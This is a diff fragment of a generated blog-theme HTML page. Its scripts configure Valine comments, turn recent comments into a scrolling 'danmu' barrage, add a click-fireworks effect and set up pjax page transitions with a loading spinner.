+  requiredFields = requiredFields.split(',');
+  comment_el = '.comment';
+  let looperValine = null;
+  load_valine = function () {
+    if ($(comment_el).length) {
+      var valine = new Valine({
+        el: '#vcomment',
+        path: window.location.pathname,
+        notify: false,
+        verify: false,
+        app_id: "",
+        app_key: "",
+        placeholder: "客官，说点什么吧",
+        avatar: "",
+        master: "",   //博主邮箱md5
+        tagMeta: ["博主","小伙伴","访客"],     //标识字段名
+        friends: "",
+        metaPlaceholder: { "nick": "昵称/QQ号", "mail": "邮箱" },
+        requiredFields: requiredFields,
+        enableQQ: true,
+      });
+      function debounce(fn) {
+        var timerID = null
+        return function () {
+          var arg = arguments[0]   //获取事件
+          if (timerID) {
+            clearTimeout(timerID)
+          }
+          timerID = setTimeout(function () {
+            fn(arg)              //事件传入函数
+          }, 200)
+        }
+      }
+      //查询评论 valine.Q('*').limit(7) -- 查询所有，限制7条, 下面的的代码是查询当前页面
+      var themeDanmu = eval('false');
+      var themeLoop = eval('false');
+      var themeLooperTime = '5000' || 5000;
+      var speed = '40' || 20;
+      var isBarrager = true;
+      if (themeDanmu == true) {
+        do_barrager();
+        if ($('.danmuBox').length <= 0) {
+          $('.navbar').append('<div class="danmuBox"><div class="danmuBtn open"><span class="danmuCircle"></span><span class="danmuText">弹幕</span></div></div>');
+        }
+        $('.danmuBtn').on('click', debounce(
+          function () {
+            if ($('.danmuBtn').hasClass('open')) {
+              $('.danmuBtn').removeClass('open')
+              clearInterval(looperValine);
+              $.fn.barrager.removeAll();
+            } else {
+              $('.danmuBtn').addClass("open");
+              do_barrager();
+            }
+          }
+        ))
+      }
+      function do_barrager() {
+        isBarrager && valine.Q(window.location.pathname).find().then(function (comments) {
+          // var num = 0; // 可以记录条数，循环调用的时候只取最新的评论放入弹幕中
+          var run_once = true;
+          var looper_time = themeLooperTime;
+          var total = comments.length;
+          // var looper = null;
+          var index = 0;
+          if (total > 0) {
+            barrager();
+          } else {
+            // 当评论数为0的时候，自动关闭弹幕
+            // $('.danmuBtn').removeClass('open');
+          }
+          function barrager() {
+            if (run_once) {
+              //如果是首次执行,则设置一个定时器,并且把首次执行置为false
+              looperValine = setInterval(barrager, looper_time);
+              run_once = false;
+            }
+            var content = comments[index]._serverData.comment;
+            var email = comments[index]._serverData.mail;
+            var link = comments[index]._serverData.link;
+            var newcontent = content.substring(0, 50).replace(/<[^>]+>/g, "");
+            //发布一个弹幕
+            const item = {
+              img: `https://q1.qlogo.cn/g?b=qq&nk=${email}&s=640`, //图片 
+              info: newcontent, //文字 
+              href: link, //链接 
+              close: true, //显示关闭按钮 
+              speed: speed, //延迟,单位秒,默认6 
+              color: '#fff', //颜色,默认白色 
+              old_ie_color: '#000000', //ie低版兼容色,不能与网页背景相同,默认黑色
+            }
+            $('body').barrager(item);
+            //索引自增
+            index++;
+            //所有弹幕发布完毕，清除计时器。
+            if (index == total) {
+              clearInterval(looperValine);
+              if (themeLoop === true) {
+                setTimeout(function () {
+                  do_barrager();
+                }, 5000);
+              } else {
+                $('.danmuBtn').removeClass('open');
+              }
+              return false;
+            }
+
+          }
+        })
+      }
+    }
+  };
+  $(document).ready(load_valine);
+  document.addEventListener('pjax:send', function (e) {
+    
+  })
+  document.addEventListener('pjax:complete', function () {
+    load_valine();
+  });
+</script>
+
+  
+
+
+<!-- 鼠标点击特效 -->
+<!-- 爱心点击 -->
+
+  
+    <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 999; pointer-events: none;" ></canvas>
+    <script src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script>
+    <script src="/js/cursor/explosion.min.js"></script>
+  
+
+
+
+
+
+    <!-- pjax -->
+    
+
+<!-- pjax -->
+
+
+  <script src="/js/pjax@0.2.8/index.js"></script>
+  
+    <!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <div class="loading-circle"><div id="loader-circle"></div></div>
+    <script>
+      window.ShowLoading = function() {
+        $(".loading-circle").css("display", "block");
+      };
+      window.HideLoading = function() {
+        $(".loading-circle").css("display", "none");
+      }
+    </script>
+  
+	<script>
+    document.addEventListener('pjax:complete', function () {
+      window.HideLoading();
+    })
+    document.addEventListener('pjax:send', function () {
+      window.ShowLoading();
+    })
+    document.addEventListener('pjax:error', function () {
+      window.HideLoading();
+    })
+	</script>
+</div>
+
+  
+
+  <script>
+    var pjax = new Pjax({
+      elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([no-pjax])',   // 拦截正常带链接的 a 标签
+      selectors: ["#pjax-container","title"],                                   // 根据实际需要确认重载区域
+      cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+      timeout: 5000
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+
+    })
+    
+    document.addEventListener('pjax:complete', function () {
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.location.href = e.triggerElement.href;
+    })
+    
+    // 刷新不从顶部开始
+    document.addEventListener("DOMContentLoaded", function () {
+      history.scrollRestoration = 'auto';
+    })
+  </script>
+
+
+
+  </body>
+</html>
